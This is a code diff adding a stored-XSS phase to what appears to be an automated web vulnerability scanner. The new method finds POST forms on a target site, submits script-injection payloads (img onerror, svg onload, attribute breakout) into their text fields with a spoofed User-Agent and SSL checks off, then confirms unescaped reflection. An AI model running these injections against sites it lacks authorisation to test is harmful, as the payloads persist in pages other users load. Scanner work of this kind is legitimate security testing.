@@ -3795,7 +3795,167 @@ Return ONLY the payloads, one per line, no explanations."""
         except Exception as e:
             logger.error(f"[{self.name}] Phase B.2 DOM XSS testing failed: {e}", exc_info=True)
 
+        # Phase B.3: Stored XSS testing (POST → GET workflow)
+        try:
+            stored_results = await self._test_stored_xss(screenshots_dir)
+            if stored_results:
+                for f in stored_results:
+                    fp = self._generate_xss_fingerprint(f["url"], f["parameter"], "stored_xss")
+                    if fp not in self._emitted_findings:
+                        self._emitted_findings.add(fp)
+                        self._emit_xss_finding(f, status=ValidationStatus.VALIDATED_CONFIRMED.value)
+                        validated.append(f)
+                        logger.info(f"[{self.name}] Emitted Stored XSS: {f['url']} via {f['parameter']}")
+        except Exception as e:
+            logger.error(f"[{self.name}] Phase B.3 Stored XSS testing failed: {e}", exc_info=True)
+
         return validated
+
+    async def _test_stored_xss(self, screenshots_dir: Path = None) -> List[Dict]:
+        """
+        Test for stored XSS by submitting payloads via POST then checking GET pages.
+
+        Stored XSS workflow:
+        1. Discover POST forms from HTML (comments, reviews, profiles, etc.)
+        2. Submit XSS payloads via POST to each form endpoint
+        3. Fetch the original page (and related pages) via GET
+        4. Check if the payload appears unescaped in the response
+        """
+        from bugtrace.tools.visual.browser import browser_manager
+        from urllib.parse import urlparse, urljoin
+        from bs4 import BeautifulSoup
+
+        findings = []
+        canary = f"BTXSS{int(__import__('time').time()) % 10000}"
+        stored_payloads = [
+            f"<img src=x onerror=document.title='{canary}'>",
+            f"<svg onload=document.title='{canary}'>",
+            f'"><img src=x onerror=document.title=\'{canary}\'>',
+        ]
+
+        # Get HTML from the target URL
+        try:
+            state = await browser_manager.capture_state(self.url)
+            html = state.get("html", "")
+        except Exception:
+            return findings
+
+        if not html:
+            return findings
+
+        soup = BeautifulSoup(html, "html.parser")
+        parsed_url = urlparse(self.url)
+        base = f"{parsed_url.scheme}://{parsed_url.netloc}"
+
+        # Find POST forms (comment forms, review forms, profile updates, etc.)
+        post_forms = []
+        for form in soup.find_all("form"):
+            method = (form.get("method", "GET") or "GET").upper()
+            if method != "POST":
+                continue
+            action = form.get("action", "")
+            form_url = urljoin(self.url, action) if action else self.url
+
+            # Extract form fields
+            fields = {}
+            text_fields = []
+            for inp in form.find_all(["input", "textarea", "select"]):
+                name = inp.get("name")
+                if not name:
+                    continue
+                input_type = (inp.get("type", "text") or "text").lower()
+                if input_type in ("submit", "button", "reset", "file", "image"):
+                    continue
+                default = inp.get("value", "")
+                fields[name] = default
+                # Track text-like fields as injection points
+                if input_type in ("text", "search", "url", "email") or inp.name == "textarea":
+                    text_fields.append(name)
+                elif input_type == "hidden" and "csrf" not in name.lower() and "token" not in name.lower():
+                    text_fields.append(name)
+
+            if text_fields and fields:
+                post_forms.append({
+                    "url": form_url,
+                    "fields": fields,
+                    "text_fields": text_fields,
+                })
+
+        if not post_forms:
+            return findings
+
+        logger.info(f"[{self.name}] Stored XSS: found {len(post_forms)} POST forms to test")
+
+        # Test each form
+        for form_info in post_forms[:5]:  # Cap at 5 forms
+            form_url = form_info["url"]
+            fields = form_info["fields"]
+            text_fields = form_info["text_fields"]
+
+            for target_field in text_fields[:3]:  # Cap at 3 fields per form
+                for payload in stored_payloads:
+                    try:
+                        # Submit the payload via POST
+                        submit_data = dict(fields)
+                        submit_data[target_field] = payload
+
+                        async with http_manager.session(ConnectionProfile.PROBE) as session:
+                            async with session.post(
+                                form_url, data=submit_data, ssl=False,
+                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+                                allow_redirects=True,
+                                timeout=aiohttp.ClientTimeout(total=8)
+                            ) as resp:
+                                post_status = resp.status
+
+                        if post_status >= 500:
+                            continue
+
+                        # Check if payload appears on the page (GET the original URL)
+                        check_urls = [self.url]
+                        if form_url != self.url:
+                            check_urls.append(form_url)
+
+                        for check_url in check_urls:
+                            async with http_manager.session(ConnectionProfile.PROBE) as session:
+                                async with session.get(
+                                    check_url, ssl=False,
+                                    timeout=aiohttp.ClientTimeout(total=5)
+                                ) as resp:
+                                    body = await resp.text()
+
+                            # Check for unescaped payload in response
+                            if canary in body and (f"onerror=document.title='{canary}'" in body
+                                                   or f"onload=document.title='{canary}'" in body):
+                                findings.append({
+                                    "type": "XSS",
+                                    "subtype": "STORED_XSS",
+                                    "url": check_url,
+                                    "parameter": target_field,
+                                    "payload": payload,
+                                    "context": "stored_xss",
+                                    "evidence": {
+                                        "validated": True,
+                                        "level": "stored",
+                                        "post_url": form_url,
+                                        "check_url": check_url,
+                                        "xss_type": "stored",
+                                        "validation_method": "http_response_analysis",
+                                    },
+                                    "confidence": 0.95,
+                                    "validated": True,
+                                    "status": "VALIDATED_CONFIRMED",
+                                    "http_method": "POST",
+                                })
+                                logger.info(f"[{self.name}] STORED XSS CONFIRMED: POST {form_url} field '{target_field}' → reflected on GET {check_url}")
+                                break  # One payload confirmed is enough for this field
+                        if findings:
+                            break  # Found stored XSS for this field
+                    except Exception as e:
+                        logger.debug(f"[{self.name}] Stored XSS test failed: {e}")
+                        continue
+
+        return findings
 
     async def _xss_escalation_pipeline(
         self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
